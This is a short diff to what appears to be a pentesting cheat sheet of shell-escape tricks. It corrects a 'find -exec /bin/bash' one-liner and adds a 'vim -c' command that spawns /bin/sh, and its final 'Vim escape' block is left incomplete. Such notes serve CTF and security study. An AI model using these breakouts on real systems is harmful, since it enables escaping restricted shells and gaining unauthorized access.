@@ -110,7 +110,15 @@ find  -exec /bin/awk 'BEGIN {system("bin/sh")}'
 ```
 OR:
 ```bash
-find -exec /bin/bash \; quit 
+find -exec /bin/bash \; -quit 
+```
+6. Vim to shell 
+```bash
+vim -c ':! /bin/sh'
+```
+Vim escape
+```vim
+:set
 ```
 
 
